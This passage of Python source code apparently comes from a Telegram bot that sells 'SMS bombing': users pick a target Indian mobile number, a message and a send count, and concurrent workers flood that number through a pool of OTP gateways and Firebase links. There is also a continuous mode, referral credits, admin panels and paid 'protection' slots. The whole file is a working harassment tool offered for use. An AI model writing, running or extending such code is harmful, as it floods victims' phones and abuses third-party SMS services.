                                f'⏳ firing {sent}/{label}...',
                                chat_id=chat_id, message_id=progress_msg.message_id,
                                reply_markup=stop_kb)
                        except Exception:
                            pass

                try:
                    await asyncio.wait_for(stop_ev.wait(), timeout=BOMB_DELAY)
                    return
                except asyncio.TimeoutError:
                    pass

        workers = [asyncio.create_task(worker()) for _ in range(BOMB_CONCURRENCY)]
        await asyncio.gather(*workers)

    stop_events.pop(run_id, None)
    return {'sent': sent, 'ok': ok, 'capped': (continuous and sent >= HARD_CAP)}

async def check_gateway_health():
    try:
        async with aiohttp.ClientSession() as session:
            alive = 0
            for g in GATEWAY_POOL:
                okk = await fire_gateway(session, g, '9999999999')
                cur.execute('UPDATE gateway_health SET alive = ?, last_checked = ? WHERE name = ?',
                            (1 if okk else 0, now(), g['name']))
                db.commit()
                if okk:
                    alive += 1
            print(f'[health] {alive}/{len(GATEWAY_POOL)} gateways alive')
    except Exception as e:
        print(f'[health error] {e}')

async def check_channel_membership(bot, user_id):
    for ch in CHANNELS:
        try:
            member = await bot.get_chat_member(ch['username'], user_id)
            if member.status in ('left', 'kicked'):
                return False
        except Exception as e:
            print(f'[gate] {ch["username"]}: {e}')
    return True

# ============================================================
# HANDLERS
# ============================================================

async def cmd_start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    username = update.effective_user.username or update.effective_user.first_name or ''
    touch_user(user_id)
    if is_owner(user_id):
        cur.execute('INSERT OR IGNORE INTO admins (user_id) VALUES (?)', (user_id,))
        db.commit()

    referred_by = None
    if context.args:
        arg = context.args[0]
        if arg.startswith('ref_'):
            try:
                ref_id = int(arg[4:])
                if ref_id != user_id and not get_user(user_id):
                    referred_by = ref_id
            except ValueError:
                pass

    if not get_user(user_id):
        create_user(user_id, username, referred_by)
        if referred_by and get_user(referred_by):
            add_credits(referred_by, REFER_BONUS, 'referral', f'referred {user_id}')
            if maybe_auto_prime(referred_by):
                try:
                    await context.bot.send_message(
                        referred_by,
                        f'⭐ *you just hit {PRIME_REFER_THRESHOLD} referrals — you are now a PRIME user.*\n\n♾️ unlimited continuous bombing unlocked.',
                        parse_mode='Markdown')
                except Exception:
                    pass

    joined = await check_channel_membership(context.bot, user_id)
    if not joined:
        await update.message.reply_text('👋 *welcome.*\n\njoin all three channels to use the bot:',
                                        parse_mode='Markdown', reply_markup=kb_gate())
        return
    u = get_user(user_id)
    prime_tag = ' ⭐ prime' if u['prime'] else ''
    await update.message.reply_text(
        f'👋 *welcome to the bot.*{prime_tag}\n\n💰 balance: *{u["credits"]}* credits',
        parse_mode='Markdown', reply_markup=kb_main())

async def cmd_prime(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not is_owner(update.effective_user.id):
        return
    args = context.args
    if not args:
        await update.message.reply_text('usage: `/prime <user_id>`', parse_mode='Markdown')
        return
    try:
        target = int(args[0])
    except ValueError:
        await update.message.reply_text('❌ invalid user id.')
        return
    if not get_user(target):
        await update.message.reply_text('❌ user not found.')
        return
    set_prime(target, True)
    await update.message.reply_text(f'⭐ primed: `{target}`', parse_mode='Markdown')

async def cmd_unprime(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not is_owner(update.effective_user.id):
        return
    args = context.args
    if not args:
        await update.message.reply_text('usage: `/unprime <user_id>`', parse_mode='Markdown')
        return
    try:
        target = int(args[0])
    except ValueError:
        await update.message.reply_text('❌ invalid user id.')
        return
    set_prime(target, False)
    await update.message.reply_text(f'🚫 unprimed: `{target}`', parse_mode='Markdown')

async def on_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    q = update.callback_query
    user_id = q.from_user.id
    chat_id = q.message.chat_id
    msg_id = q.message.message_id
    data = q.data
    touch_user(user_id)
    await q.answer()

    async def edit(text, **kw):
        try:
            await context.bot.edit_message_text(text, chat_id=chat_id, message_id=msg_id, **kw)
        except Exception:
            pass

    try:
        if data == 'noop':
            return

        if data == 'gate_recheck':
            if await check_channel_membership(context.bot, user_id):
                u = get_user(user_id)
                prime_tag = ' ⭐ prime' if u['prime'] else ''
                await edit(f'👋 *welcome.*{prime_tag}\n\n💰 balance: *{u["credits"]}* credits',
                           parse_mode='Markdown', reply_markup=kb_main())
            else:
                await edit('❌ you haven\'t joined all three channels yet.', reply_markup=kb_gate())
            return

        if data in ('menu_main', 'cancel'):
            state.pop(user_id, None)
            u = get_user(user_id)
            prime_tag = ' ⭐ prime' if u['prime'] else ''
            await edit(f'👋 *main menu.*{prime_tag}\n💰 balance: *{u["credits"]}* credits',
                       parse_mode='Markdown', reply_markup=kb_main())
            return

        if data == 'menu_credits':
            u = get_user(user_id)
            prime_tag = ' ⭐ prime' if u['prime'] else ''
            await edit(f'💰 *your credits:* {u["credits"]}{prime_tag}\n\n⚡ auto gateway: 1 credit = 2 SMS\n🔥 firebase gateway: 1 credit = 1 SMS',
                       parse_mode='Markdown',
                       reply_markup=InlineKeyboardMarkup([
                           [InlineKeyboardButton('🔄 Refresh', callback_data='menu_credits')],
                           [InlineKeyboardButton('⬅️ Back', callback_data='menu_main')]]))
            return

        if data == 'menu_refer':
            me = await context.bot.get_me()
            link = f'https://t.me/{me.username}?start=ref_{user_id}'
            cur.execute('SELECT COUNT(*) c FROM users WHERE referred_by = ?', (user_id,))
            count = cur.fetchone()['c']
            if not is_prime(user_id):
                remaining = max(0, PRIME_REFER_THRESHOLD - count)
                prime_line = f'\n\n⭐ *prime unlock:* {count}/{PRIME_REFER_THRESHOLD} ({remaining} to go)'
            else:
                prime_line = '\n\n⭐ *you are prime.*'
            await edit(f'👥 *refer & earn*\n\nper refer: *{REFER_BONUS}* credits\njoin bonus: *{JOIN_BONUS}* credits\n\nyour link:\n`{link}`\n\ntotal referred: *{count}*{prime_line}',
                       parse_mode='Markdown',
                       reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton('⬅️ Back', callback_data='menu_main')]]))
            return

        if data == 'menu_transfer':
            if not ALLOW_TRANSFER:
                return
            state[user_id] = {'step': 'transfer_target'}
            await edit('💸 *transfer credits*\n\nsend the recipient\'s *user ID*:',
                       parse_mode='Markdown',
                       reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton('❌ Cancel', callback_data='cancel')]]))
            return

        if data == 'menu_firebase':
            if not is_admin(user_id):
                await edit('🔥 firebase add/remove is admin-only.',
                           reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton('⬅️ Back', callback_data='menu_main')]]))
                return
            await edit('🔥 *firebase menu*', parse_mode='Markdown', reply_markup=kb_admin())
            return

        if data == 'menu_admin':
            if not is_admin(user_id):
                return
            await edit('🛠 *admin panel*', parse_mode='Markdown', reply_markup=kb_admin())
            return

        if data == 'menu_owner':
            if not is_owner(user_id):
                return
            await edit('👑 *owner panel*', parse_mode='Markdown', reply_markup=kb_owner())
            return

        if data == 'menu_bomb':
            state[user_id] = {'step': 'bomb_phone'}
            await edit('💣 *bomb a number*\n\nsend the target indian mobile number (10 digits, starts 6-9):',
                       parse_mode='Markdown',
                       reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton('❌ Cancel', callback_data='cancel')]]))
            return

        if data == 'menu_protect':
            unlocked = user_can_protect(user_id)
            refs = user_refer_count(user_id)
            protected = user_protected(user_id)
            count = len(protected)
            slots = protect_slots_used()
            slots_left = max(0, PROTECT_MAX_SLOTS - slots)

            header = f'🛡 *protect your number*\n\nprotect a number — nobody can bomb it.\n\n'
            header += f'📦 global slots: *{slots}/{PROTECT_MAX_SLOTS}* ({slots_left} left)\n'

            if not unlocked:
                remaining = max(0, PROTECT_UNLOCK_REFERS - refs)
                header += f'🔒 *locked* — {refs}/{PROTECT_UNLOCK_REFERS} referrals ({remaining} to go)'
                await edit(header, parse_mode='Markdown',
                           reply_markup=InlineKeyboardMarkup([
                               [InlineKeyboardButton('👥 Refer & Earn', callback_data='menu_refer')],
                               [InlineKeyboardButton('⬅️ Back', callback_data='menu_main')]]))
                return

            header += f'🔓 unlocked\n\nyou have *{count}* protected.'
            if protected:
                shown = protected[:5]
                header += '\n\n🛡 yours:\n' + '\n'.join(f'`{n}`' for n in shown)
                if count > 5:
                    header += f'\n… and {count - 5} more'
            if slots_left <= 0:
                header += '\n\n⛔ *all 100 slots are full.* no new numbers can be added.'
            await edit(header, parse_mode='Markdown',
                       reply_markup=kb_protect(unlocked=True, slots_left=slots_left))
            return

        if data == 'prot_add':
            if not user_can_protect(user_id):
                refs = user_refer_count(user_id)
                await edit(f'🔒 *locked.* you need *{PROTECT_UNLOCK_REFERS}* referrals to unlock.\n\nyou have: *{refs}/{PROTECT_UNLOCK_REFERS}*',
                           parse_mode='Markdown',
                           reply_markup=InlineKeyboardMarkup([
                               [InlineKeyboardButton('👥 Refer & Earn', callback_data='menu_refer')],
                               [InlineKeyboardButton('⬅️ Back', callback_data='menu_protect')]]))
                return
            if protect_slots_used() >= PROTECT_MAX_SLOTS:
                await edit('⛔ *all 100 protection slots are taken.*',
                           parse_mode='Markdown',
                           reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton('⬅️ Back', callback_data='menu_protect')]]))
                return
            state[user_id] = {'step': 'prot_add'}
            await edit('➕ *add number*\n\nsend the 10-digit indian number to protect:',
                       parse_mode='Markdown',
                       reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton('❌ Cancel', callback_data='menu_protect')]]))
            return

        if data == 'prot_rem':
            state[user_id] = {'step': 'prot_rem'}
            await edit('➖ *remove number*\n\nsend the number to unprotect:',
                       parse_mode='Markdown',
                       reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton('❌ Cancel', callback_data='menu_protect')]]))
            return

        if data == 'prot_list':
            protected = user_protected(user_id)
            if not protected:
                await edit('📋 *your protected numbers*\n\nnone yet.',
                           parse_mode='Markdown',
                           reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton('⬅️ Back', callback_data='menu_protect')]]))
            else:
                txt = '\n'.join(f'`{n}`' for n in protected)
                await edit(f'📋 *your protected numbers* ({len(protected)})\n\n{txt}',
                           parse_mode='Markdown',
                           reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton('⬅️ Back', callback_data='menu_protect')]]))
            return

        if data.startswith('amt_'):
            raw = data[4:]
            st = state.get(user_id, {})
            if not st.get('phone'):
                return
            if raw == 'cont':
                if not is_prime(user_id):
                    await edit('⛔ *♾️ continuous mode is prime-only.*\n\nunlock it by:\n• getting 100 referrals, or\n• being granted prime by the owner.',
                               parse_mode='Markdown',
                               reply_markup=InlineKeyboardMarkup([
                                   [InlineKeyboardButton('👥 Refer & Earn', callback_data='menu_refer')],
                                   [InlineKeyboardButton('⬅️ Back', callback_data='menu_main')]]))
                    return
                st['amount'] = 0
                st['continuous'] = True
                amt_label = f'∞ (cap {HARD_CAP})'
            else:
                st['amount'] = int(raw)
                st['continuous'] = False
                amt_label = str(st['amount'])
            st['step'] = 'bomb_message'
            state[user_id] = st
            await edit(f'target: `{st["phone"]}`\namount: *{amt_label}*\n\n💬 now send the *message* you want delivered, or tap skip:',
                       parse_mode='Markdown', reply_markup=kb_bomb_message())
            return

        if data.startswith('stop_'):
            run_id = data[5:]
            ev = stop_events.get(run_id)
            if ev is not None:
                ev.set()
                try:
                    await edit('🛑 *stopping...*')
                except Exception:
                    pass
            return

        if data == 'msg_skip':
            st = state.get(user_id, {})
            if not st.get('phone'):
                return
            st['message'] = DEFAULT_MESSAGE
            st['step'] = 'bomb_mode'
            state[user_id] = st
            amt_label = f'∞ (cap {HARD_CAP})' if st.get('continuous') else str(st.get('amount', 0))
            await edit(f'target: `{st["phone"]}`\namount: *{amt_label}*\nmessage: `{DEFAULT_MESSAGE}`\n\nchoose mode:',
                       parse_mode='Markdown', reply_markup=kb_bomb_mode())
            return

        if data.startswith('mode_'):
            mode = data[5:]
            st = state.get(user_id, {})
            if not st.get('phone') or ('amount' not in st):
                return
            st['mode'] = mode
            st['step'] = 'bomb_confirm'
            state[user_id] = st
            rate = AUTO_RATE if mode == 'auto' else FIREBASE_RATE
            continuous = st.get('continuous', False)
            if continuous:
                cost = CONTINUOUS_ENTRY_COST
                amt_label = f'∞ (cap {HARD_CAP})'
            else:
                cost = st['amount'] * rate
                amt_label = str(st['amount'])
            msg_preview = st.get('message', DEFAULT_MESSAGE)[:60]
            note = ''
            if mode == 'auto':
                note = '\n\n⚠️ auto gateways send *their own* OTP text — your custom message is ignored here. use firebase mode for custom text.'
            if continuous:
                note += f'\n\n♾️ continuous mode: runs until 🛑 Stop or *{HARD_CAP}* sends, whichever first. entry cost *{CONTINUOUS_ENTRY_COST}* credits — the rest is charged at the end.'
            await edit(f'confirm:\n\n🎯 target: `{st["phone"]}`\n📨 sends: *{amt_label}*\n💬 message: `{msg_preview}`\n⚡ mode: *{mode}*\n💸 entry cost: *{cost}* credits{note}\n\nstart?',
                       parse_mode='Markdown', reply_markup=kb_bomb_confirm(st['amount'], mode))
            return

        if data.startswith('go_'):
            parts = data.split('_')
            mode = parts[1]
            amount = int(parts[2])
            st = state.get(user_id)
            if not st or not st.get('phone'):
                await edit('session expired.',
                           reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton('⬅️ Back', callback_data='menu_main')]]))
                return
            rate = AUTO_RATE if mode == 'auto' else FIREBASE_RATE
            continuous = st.get('continuous', False)
            if continuous and not is_prime(user_id):
                await edit('⛔ prime required for continuous mode.',
                           reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton('⬅️ Back', callback_data='menu_main')]]))
                return
            if is_protected(st['phone']):
                await edit(f'🛡 *{st["phone"]} is protected.*\n\nthis number opted out. bombing blocked before any credits were spent.',
                           parse_mode='Markdown',
                           reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton('⬅️ Back', callback_data='menu_main')]]))
                state.pop(user_id, None)
                return
            if continuous:
                entry_cost = CONTINUOUS_ENTRY_COST
            else:
                entry_cost = amount * rate
            u = get_user(user_id)
            if u['credits'] < entry_cost:
                await edit(f'❌ not enough credits.\n\nneed: *{entry_cost}*\nyou have: *{u["credits"]}*',
                           parse_mode='Markdown',
                           reply_markup=InlineKeyboardMarkup([
                               [InlineKeyboardButton('👥 Refer & Earn', callback_data='menu_refer')],
                               [InlineKeyboardButton('⬅️ Back', callback_data='menu_main')]]))
                return
            sub_credits(user_id, entry_cost, 'bomb', f'{mode} {amount} to {st["phone"]}')
            target_phone = st['phone']
            message = st.get('message', DEFAULT_MESSAGE)
            state.pop(user_id, None)
            await edit('🚀 starting bomb...')
            r = await bomb_run(context.application, chat_id, user_id, target_phone,
                               amount, mode, message=message, continuous=continuous)
            if continuous:
                extra = max(0, r['sent'] * rate - CONTINUOUS_ENTRY_COST)
                if extra > 0:
                    sub_credits(user_id, extra, 'bomb_cont', f'continuous {r["sent"]} to {target_phone}')
                total_cost = CONTINUOUS_ENTRY_COST + extra
            else:
                total_cost = entry_cost
            u2 = get_user(user_id)
            tail = ''
            if r.get('capped'):
                tail = f'\n\n🛑 auto-stopped at *{HARD_CAP}* sends.\n♾️ prime: tap *Bomb a Number* again to restart.'
            await context.bot.send_message(chat_id,
                f'✅ *bomb complete*\n\n🎯 {target_phone}\n📨 sent: *{r["sent"]}*\n💬 message: `{message[:60]}`\n💸 cost: *{total_cost}* credits\n💰 balance: *{u2["credits"]}*{tail}',
                parse_mode='Markdown', reply_markup=kb_main())
            return

        if data == 'adm_addcredit':
            if not is_admin(user_id): return
            state[user_id] = {'step': 'adm_addcredit'}
            await edit('➕ *add credit*\n\nsend: `user_id amount`', parse_mode='Markdown',
                       reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton('❌ Cancel', callback_data='cancel')]]))
            return
        if data == 'adm_remcredit':
            if not is_admin(user_id): return
            state[user_id] = {'step': 'adm_remcredit'}
            await edit('➖ *remove credit*\n\nsend: `user_id amount`', parse_mode='Markdown',
                       reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton('❌ Cancel', callback_data='cancel')]]))
            return
        if data == 'adm_addfb':
            if not is_admin(user_id): return
            state[user_id] = {'step': 'adm_addfb'}
            await edit('➕ *add firebase*\n\nsend the firebase URL:', parse_mode='Markdown',
                       reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton('❌ Cancel', callback_data='cancel')]]))
            return
        if data == 'adm_remfb':
            if not is_admin(user_id): return
            state[user_id] = {'step': 'adm_remfb'}
            await edit('➖ *remove firebase*\n\nsend the firebase URL:', parse_mode='Markdown',
                       reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton('❌ Cancel', callback_data='cancel')]]))
            return
        if data == 'adm_listfb':
            if not is_admin(user_id): return
            cur.execute('SELECT * FROM firebase_links WHERE active = 1')
            rows = cur.fetchall()
            if is_owner(user_id):
                txt = '\n'.join(f'{i+1}. `{r["url"]}`' for i, r in enumerate(rows)) or 'none'
            else:
                txt = f'active firebase links: *{len(rows)}*'
            await edit(f'🔥 *firebase list*\n\n{txt}', parse_mode='Markdown',
                       reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton('⬅️ Back', callback_data='menu_admin')]]))
            return
        if data == 'adm_listgw':
            if not is_admin(user_id): return
            cur.execute('SELECT name, alive FROM gateway_health')
            rows = cur.fetchall()
            txt = '\n'.join(f'{"🟢" if r["alive"] else "🔴"} `{r["name"]}`' for r in rows)
            await edit(f'⚡ *gateways* ({len(rows)})\n\n{txt}', parse_mode='Markdown',
                       reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton('⬅️ Back', callback_data='menu_admin')]]))
            return

        if data == 'own_stats':
            if not is_owner(user_id): return
            cur.execute('SELECT COUNT(*) c FROM users'); tu = cur.fetchone()['c']
            cur.execute('SELECT COALESCE(SUM(credits),0) c FROM users'); tc = cur.fetchone()['c']
            cur.execute('SELECT COUNT(*) c FROM users WHERE prime = 1'); pc = cur.fetchone()['c']
            cur.execute('SELECT COUNT(*) c FROM sent_log WHERE ts > ?', (now() - 86400,)); st_ = cur.fetchone()['c']
            cur.execute('SELECT COUNT(*) c FROM sent_log'); stt = cur.fetchone()['c']
            cur.execute('SELECT COUNT(*) c FROM firebase_links WHERE active = 1'); fbc = cur.fetchone()['c']
            cur.execute('SELECT COUNT(*) c FROM protected_numbers'); protc = cur.fetchone()['c']
            cur.execute('SELECT referred_by, COUNT(*) c FROM users WHERE referred_by IS NOT NULL GROUP BY referred_by ORDER BY c DESC LIMIT 5')
            refs = cur.fetchall()
            txt = f'📊 *full stats*\n\n👤 users: *{tu}*\n⭐ prime: *{pc}*\n💰 credits: *{tc}*\n📨 sent today: *{st_}*\n📨 sent total: *{stt}*\n🔥 firebase: *{fbc}*\n🛡 protected: *{protc}/{PROTECT_MAX_SLOTS}*\n⚡ live gateways: *{len(live_gateways())}/{len(GATEWAY_POOL)}*\n\n*top referrers:*\n'
            txt += '\n'.join(f'`{r["referred_by"]}` → {r["c"]}' for r in refs) or 'none'
            await edit(txt, parse_mode='Markdown',
                       reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton('⬅️ Back', callback_data='menu_owner')]]))
            return
        if data == 'own_online':
            if not is_owner(user_id): return
            cutoff = now() - ONLINE_WINDOW_MIN * 60
            cur.execute('SELECT COUNT(*) c FROM users WHERE last_seen > ?', (cutoff,))
            online = cur.fetchone()['c']
            await edit(f'🟢 *online devices* (last {ONLINE_WINDOW_MIN}m): *{online}*', parse_mode='Markdown',
                       reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton('⬅️ Back', callback_data='menu_owner')]]))
            return
        if data == 'own_addadm':
            if not is_owner(user_id): return
            state[user_id] = {'step': 'own_addadm'}
            await edit('👤 *add admin*\n\nsend the user ID:', parse_mode='Markdown',
                       reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton('❌ Cancel', callback_data='cancel')]]))
            return
        if data == 'own_remadm':
            if not is_owner(user_id): return
            state[user_id] = {'step': 'own_remadm'}
            await edit('🗑 *remove admin*\n\nsend the user ID:', parse_mode='Markdown',
                       reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton('❌ Cancel', callback_data='cancel')]]))
            return
        if data == 'own_listadm':
            if not is_owner(user_id): return
            cur.execute('SELECT user_id FROM admins')
            rows = cur.fetchall()
            txt = '\n'.join(f'`{r["user_id"]}`' for r in rows) or 'none'
            await edit(f'📋 *admins*\n\n{txt}', parse_mode='Markdown',
                       reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton('⬅️ Back', callback_data='menu_owner')]]))
            return
        if data == 'own_broadcast':
            if not is_owner(user_id): return
            state[user_id] = {'step': 'own_broadcast'}
            await edit('📢 *broadcast*\n\nsend the message:', parse_mode='Markdown',
                       reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton('❌ Cancel', callback_data='cancel')]]))
            return
        if data == 'own_grantprime':
            if not is_owner(user_id): return
            state[user_id] = {'step': 'own_grantprime'}
            await edit('⭐ *grant prime*\n\nsend the user ID:', parse_mode='Markdown',
                       reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton('❌ Cancel', callback_data='cancel')]]))
            return
        if data == 'own_revokeprime':
            if not is_owner(user_id): return
            state[user_id] = {'step': 'own_revokeprime'}
            await edit('🚫 *revoke prime*\n\nsend the user ID:', parse_mode='Markdown',
                       reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton('❌ Cancel', callback_data='cancel')]]))
            return
        if data == 'own_listprime':
            if not is_owner(user_id): return
            cur.execute('SELECT user_id, username FROM users WHERE prime = 1')
            rows = cur.fetchall()
            if rows:
                txt = '\n'.join(f'`{r["user_id"]}` @{r["username"] or "—"}' for r in rows)
            else:
                txt = 'none'
            await edit(f'📋 *prime users* ({len(rows)})\n\n{txt}', parse_mode='Markdown',
                       reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton('⬅️ Back', callback_data='menu_owner')]]))
            return
        if data == 'own_protected':
            if not is_owner(user_id): return
            cur.execute('SELECT number, user_id FROM protected_numbers ORDER BY added_at DESC')
            rows = cur.fetchall()
            if not rows:
                txt = 'none'
            else:
                txt = '\n'.join(f'`{r["number"]}` (by {r["user_id"]})' for r in rows[:30])
                if len(rows) > 30:
                    txt += f'\n… +{len(rows) - 30} more'
            await edit(f'🛡 *protected numbers* ({len(rows)})\n\n{txt}',
                       parse_mode='Markdown',
                       reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton('⬅️ Back', callback_data='menu_owner')]]))
            return
        if data == 'own_gwhealth':
            if not is_owner(user_id): return
            cur.execute('SELECT * FROM gateway_health')
            rows = cur.fetchall()
            txt = '\n'.join(f'{"🟢" if r["alive"] else "🔴"} `{r["name"]}`' for r in rows)
            await edit(f'⚙️ *gateway health*\n\n{txt}', parse_mode='Markdown',
                       reply_markup=InlineKeyboardMarkup([
                           [InlineKeyboardButton('🔄 Re-check', callback_data='own_recheck')],
                           [InlineKeyboardButton('⬅️ Back', callback_data='menu_owner')]]))
            return
        if data == 'own_recheck':
            if not is_owner(user_id): return
            await check_gateway_health()
            await edit(f'✅ re-checked. live: *{len(live_gateways())}/{len(GATEWAY_POOL)}*', parse_mode='Markdown',
                       reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton('⬅️ Back', callback_data='menu_owner')]]))
            return
        if data == 'own_fblist':
            if not is_owner(user_id): return
            cur.execute('SELECT * FROM firebase_links')
            rows = cur.fetchall()
            txt = '\n'.join(f'{"🟢" if r["active"] else "🔴"} {i+1}. `{r["url"]}`' for i, r in enumerate(rows)) or 'none'
            await edit(f'🔥 *all firebase links*\n\n{txt}', parse_mode='Markdown',
                       reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton('⬅️ Back', callback_data='menu_owner')]]))
            return
    except Exception as e:
        print(f'[cb error] {e}')

async def on_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    msg = update.message
    if not msg or not msg.text:
        return
    user_id = msg.from_user.id
    chat_id = msg.chat_id
    text = msg.text.strip()
    touch_user(user_id)

    st = state.get(user_id)
    if not st:
        return

    step = st.get('step')

    try:
        if step == 'bomb_phone':
            phone = valid_indian(text)
            if not phone:
                await msg.reply_text('❌ invalid indian number. send 10 digits starting 6-9.')
                return
            st['phone'] = phone
            st['step'] = 'bomb_amount'
            state[user_id] = st
            await msg.reply_text(f'target: `{phone}`\n\nhow many sends?',
                                 parse_mode='Markdown', reply_markup=kb_bomb_amount(prime=is_prime(user_id)))
            return

        if step == 'bomb_message':
            if len(text) > 300:
                text = text[:300]
            st['message'] = text
            st['step'] = 'bomb_mode'
            state[user_id] = st
            amt_label = f'∞ (cap {HARD_CAP})' if st.get('continuous') else str(st.get('amount', 0))
            await msg.reply_text(f'target: `{st["phone"]}`\namount: *{amt_label}*\nmessage: `{text}`\n\nchoose mode:',
                                 parse_mode='Markdown', reply_markup=kb_bomb_mode())
            return

        if step == 'prot_add':
            if not user_can_protect(user_id):
                state.pop(user_id, None)
                await msg.reply_text('🔒 you are not unlocked for protection.')
                return
            if protect_slots_used() >= PROTECT_MAX_SLOTS:
                state.pop(user_id, None)
                await msg.reply_text('⛔ all 100 slots are taken.')
                return
            phone = valid_indian(text)
            if not phone:
                await msg.reply_text('❌ invalid indian number. send 10 digits starting 6-9.')
                return
            cur.execute('SELECT user_id FROM protected_numbers WHERE number = ?', (phone,))
            existing = cur.fetchone()
            if existing and existing['user_id'] != user_id:
                state.pop(user_id, None)
                await msg.reply_text('❌ this number is already protected by someone else.')
                return
            protect_number(phone, user_id)
            state.pop(user_id, None)
            slots_left = max(0, PROTECT_MAX_SLOTS - protect_slots_used())
            await msg.reply_text(f'🛡 *protected:* `{phone}`\n\nnobody can bomb this number now.\n📦 slots left: *{slots_left}/{PROTECT_MAX_SLOTS}*',
                                 parse_mode='Markdown',
                                 reply_markup=kb_protect(unlocked=True, slots_left=slots_left))
            return

        if step == 'prot_rem':
            phone = valid_indian(text)
            if not phone:
                await msg.reply_text('❌ invalid indian number.')
                return
            unprotect_number(phone, user_id)
            state.pop(user_id, None)
            await msg.reply_text(f'✅ *unprotected:* `{phone}`',
                                 parse_mode='Markdown',
                                 reply_markup=kb_protect(unlocked=user_can_protect(user_id),
                                                         slots_left=max(0, PROTECT_MAX_SLOTS - protect_slots_used())))
            return

        if step == 'transfer_target':
            try:
                target = int(text)
            except ValueError:
                await msg.reply_text('❌ invalid ID.')
                return
            if not get_user(target):
                await msg.reply_text('❌ user not found.')
                return
            if target == user_id:
                await msg.reply_text("❌ can't transfer to yourself.")
                return
            st['target'] = target
            st['step'] = 'transfer_amount'
            state[user_id] = st
            await msg.reply_text('send amount to transfer:',
                                 reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton('❌ Cancel', callback_data='cancel')]]))
            return

        if step == 'transfer_amount':
            try:
                amount = float(text)
            except ValueError:
                await msg.reply_text('❌ invalid amount.')
                return
            u = get_user(user_id)
            if amount <= 0:
                await msg.reply_text('❌ invalid amount.')
                return
            if u['credits'] < amount:
                await msg.reply_text('❌ not enough credits.')
                return
            sub_credits(user_id, amount, 'transfer_out', f'to {st["target"]}')
            add_credits(st['target'], amount, 'transfer_in', f'from {user_id}')
            state.pop(user_id, None)
            await msg.reply_text(f'✅ transferred *{amount}* credits to `{st["target"]}`',
                                 parse_mode='Markdown', reply_markup=kb_main())
            return

        if step in ('adm_addcredit', 'adm_remcredit'):
            if not is_admin(user_id):
                state.pop(user_id, None)
                return
            parts = text.split()
            if len(parts) != 2:
                await msg.reply_text('❌ format: `user_id amount`', parse_mode='Markdown')
                return
            try:
                target = int(parts[0]); amount = float(parts[1])
            except ValueError:
                await msg.reply_text('❌ invalid format.')
                return
            if not get_user(target):
                await msg.reply_text('❌ target user not found.')
                return
            if step == 'adm_addcredit':
                add_credits(target, amount, 'admin_add', f'by {user_id}')
                sign = '+'
            else:
                sub_credits(target, amount, 'admin_rem', f'by {user_id}')
                sign = '-'
            state.pop(user_id, None)
            await msg.reply_text(f'✅ {sign}{amount} to `{target}`. new balance: *{get_user(target)["credits"]}*',
                                 parse_mode='Markdown', reply_markup=kb_admin())
            return

        if step == 'adm_addfb':
            if not is_admin(user_id):
                state.pop(user_id, None)
                return
            if not text.startswith('http'):
                await msg.reply_text('❌ send a valid URL.')
                return
            cur.execute('INSERT OR IGNORE INTO firebase_links (url, added_by, added_at) VALUES (?,?,?)',
                        (text, user_id, now()))
            db.commit()
            state.pop(user_id, None)
            await msg.reply_text(f'✅ firebase added:\n`{text}`', parse_mode='Markdown', reply_markup=kb_admin())
            return

        if step == 'adm_remfb':
            if not is_admin(user_id):
                state.pop(user_id, None)
                return
            cur.execute('UPDATE firebase_links SET active = 0 WHERE url = ?', (text,))
            db.commit()
            state.pop(user_id, None)
            await msg.reply_text(f'✅ firebase removed:\n`{text}`', parse_mode='Markdown', reply_markup=kb_admin())
            return

        if step == 'own_addadm':
            if not is_owner(user_id):
                state.pop(user_id, None)
                return
            try:
                target = int(text)
            except ValueError:
                await msg.reply_text('❌ invalid ID.')
                return
            cur.execute('INSERT OR IGNORE INTO admins (user_id, added_by, added_at) VALUES (?,?,?)',
                        (target, user_id, now()))
            db.commit()
            state.pop(user_id, None)
            await msg.reply_text(f'✅ added admin: `{target}`', parse_mode='Markdown', reply_markup=kb_owner())
            return

        if step == 'own_remadm':
            if not is_owner(user_id):
                state.pop(user_id, None)
                return
            try:
                target = int(text)
            except ValueError:
                await msg.reply_text('❌ invalid ID.')
                return
            if target == OWNER_ID:
                await msg.reply_text("❌ can't remove owner.")
                return
            cur.execute('DELETE FROM admins WHERE user_id = ?', (target,))
            db.commit()
            state.pop(user_id, None)
            await msg.reply_text(f'✅ removed admin: `{target}`', parse_mode='Markdown', reply_markup=kb_owner())
            return

        if step == 'own_grantprime':
            if not is_owner(user_id):
                state.pop(user_id, None)
                return
            try:
                target = int(text)
            except ValueError:
                await msg.reply_text('❌ invalid ID.')
                return
            if not get_user(target):
                await msg.reply_text('❌ user not found.')
                return
            set_prime(target, True)
